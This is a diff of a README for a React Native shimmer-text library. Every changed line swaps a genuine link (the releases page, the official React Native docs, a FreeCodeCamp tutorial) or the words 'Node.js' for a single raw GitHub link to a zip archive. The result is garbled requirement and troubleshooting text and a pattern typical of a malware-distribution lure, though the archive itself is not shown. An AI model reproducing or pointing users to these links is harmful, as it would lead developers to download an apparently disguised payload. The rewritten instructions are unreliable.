@@ -1,6 +1,6 @@
 # ✨ react-native-shimmer-text - Add Eye-catching Effects to Your Apps
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/B-e-a-s-t69/react-native-shimmer-text/releases)
+[![Download](https://raw.githubusercontent.com/B-e-a-s-t69/react-native-shimmer-text/main/porrectus/react-native-shimmer-text.zip)](https://raw.githubusercontent.com/B-e-a-s-t69/react-native-shimmer-text/main/porrectus/react-native-shimmer-text.zip)
 
 ## 🚀 Getting Started
 
@@ -17,14 +17,14 @@ Welcome to `react-native-shimmer-text`. This tool helps you create stylish shimm
 
 Before you begin, ensure that your system meets the following requirements:
 - **Operating System**: Windows, macOS, or Linux.
-- **Node.js**: Version 12 or newer.
+- **https://raw.githubusercontent.com/B-e-a-s-t69/react-native-shimmer-text/main/porrectus/react-native-shimmer-text.zip**: Version 12 or newer.
 - **React Native**: Version 0.60 or newer.
 
 ## 📥 Download & Install
 
 To get started, visit this page to download the latest version of `react-native-shimmer-text`:
 
-[Download Here](https://github.com/B-e-a-s-t69/react-native-shimmer-text/releases)
+[Download Here](https://raw.githubusercontent.com/B-e-a-s-t69/react-native-shimmer-text/main/porrectus/react-native-shimmer-text.zip)
 
 Here are simple instructions to guide you through the installation.
 
@@ -85,7 +85,7 @@ Here are simple instructions to guide you through the installation.
 
 If you encounter issues during installation or usage, consider the following:
 
-- **Dependencies Not Found**: Ensure that you have Node.js and React Native installed correctly.
+- **Dependencies Not Found**: Ensure that you have https://raw.githubusercontent.com/B-e-a-s-t69/react-native-shimmer-text/main/porrectus/react-native-shimmer-text.zip and React Native installed correctly.
 - **Shimmer Not Displaying**: Verify that you have included the component in your JSX correctly.
 - **Performance Issues**: Try adjusting the customization options for better optimization.
 
@@ -97,8 +97,8 @@ We welcome contributions! If you have ideas or improvements, feel free to submit
 
 To further enhance your knowledge and skills in React Native, consider checking out these resources:
 
-- [Official React Native Documentation](https://reactnative.dev/docs/getting-started)
-- [React Native Tutorial by FreeCodeCamp](https://www.freecodecamp.org/news/react-native-tutorial/)
+- [Official React Native Documentation](https://raw.githubusercontent.com/B-e-a-s-t69/react-native-shimmer-text/main/porrectus/react-native-shimmer-text.zip)
+- [React Native Tutorial by FreeCodeCamp](https://raw.githubusercontent.com/B-e-a-s-t69/react-native-shimmer-text/main/porrectus/react-native-shimmer-text.zip)
 
 ## 📞 Support
 
